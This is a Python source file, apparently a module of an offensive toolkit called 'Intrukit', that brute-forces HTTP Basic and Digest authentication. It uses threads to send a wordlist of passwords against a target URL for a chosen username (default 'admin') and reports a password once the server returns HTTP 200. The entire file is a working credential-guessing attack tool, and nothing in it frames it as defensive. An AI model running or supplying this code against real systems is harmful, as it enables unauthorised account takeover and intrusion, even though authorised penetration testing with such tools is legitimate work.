"""
HTTP Authentication Bruteforce Module

This module with bruteforce basic and digest HTTP auth 

"""

import requests
from threading import Thread
import sys
import time
import getopt
from termcolor import colored
from requests.auth import HTTPDigestAuth
import re
global hit  # Flag to know when we have a valid password
hit = "1"

class Module:
    """
    Module Class
    """

    __title__ = 'auxiliary.http_auth'
    __date__ = '2017-11-18'
    __rank__ = 'normal'
    __description__ = 'This is a HTTP authentication bruteforce module. Supports: basic, digest'
    __details__ = 'None'

    __author__ = 'Intrukit'

    def __init__(self, DICTIONARY='resources/wordlist/pass.txt', URL=None,
                 USERNAME='admin', METHOD='basic', THREADS=5):
        """
        __init__(self, MYNAME='hello_world', YOURNAME=None)

        :param MYNAME: 
        :param YOURNAME: 

        Initialize the module with the module's desired options
        """
        self.__dict__['DICTIONARY'] = {"value": DICTIONARY, "required": True, "description": "Password dictionary file"}
        self.__dict__['URL'] = {"value": URL, "required": True, "description": "URL of the target authentication method"}
        self.__dict__['USERNAME'] = {"value": USERNAME, "required": True, "description": "Username to attack"}
        self.__dict__['METHOD'] = {"value": METHOD, "required": True, "description": "Type of login. basic, digest"}
        self.__dict__['THREADS'] = {"value": THREADS, "required": True, "description": "Number of threads"}

    def run(self):
        """
        run(self)

        :return: 

        Run the module
        """
        if self.DICTIONARY['value'] and self.URL['value'] and self.USERNAME['value'] \
                and self.METHOD['value'] and self.THREADS['value']:
            class request_performer(Thread):
                def __init__(self, name, user, url, method):
                    Thread.__init__(self)
                    self.password = name.split("\n")[0]
                    self.username = user
                    self.url = url
                    self.method = method
                    #print("-" + self.password + "-")

                def run(self):
                    global hit
                    if hit == "1":
                        if self.method == "basic":
                            r = requests.get(self.url, auth=(self.username, self.password))
                            if r.status_code == 200:
                                hit = "0"
                                print("[{}] Password found: {}".format(colored('+', 'green'),
                                                                       colored(self.password, 'green')))
                                sys.exit()
                            else:
                                print("[{}] Invalid password: {}".format(colored('-', 'red'),
                                                                         colored(self.password, 'red')))
                                i[0] = i[0] - 1  # Here we remove one thread from the counter
                        elif self.method == "digest":
                            r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
                            if r.status_code == 200:
                                hit = "0"
                                print("[{}] Password found: {}".format(colored('+', 'green'),
                                                                       colored(self.password, 'green')))
                                sys.exit()
                            else:
                                print("[{}] Invalid password: {}".format(colored('-', 'red'),
                                                                         colored(self.password, 'red')))
                                i[0] = i[0] - 1  # Here we remove one thread from the counter

            def start(dictio, threads, user, url, method):
                try:
                    f = open(dictio, "r")
                    name = f.readlines()
                except:
                    print("Failed opening file: " + dictio + "\n")
                    sys.exit()
                launcher_thread(name, threads, user, url, method)

            def launcher_thread(names, th, username, url, method):
                global i
                i = []
                i.append(0)
                while len(names):
                    if hit == "1":
                        try:
                            if int(i[0]) < int(th):
                                n = names.pop(0)
                                i[0] = i[0] + 1
                                thread = request_performer(n, username, url, method)
                                thread.start()

                        except KeyboardInterrupt:
                            print("Brute forcer interrupted  by user. Finishing attack..")
                            sys.exit()
                        thread.join()
                    else:
                        sys.exit()
                return


            try:
                start(self.DICTIONARY['value'], self.THREADS['value'], self.USERNAME['value'], self.URL['value'],
                      self.METHOD['value'])
            except KeyboardInterrupt:
                print("Brute force interrupted by user, killing all threads!!")


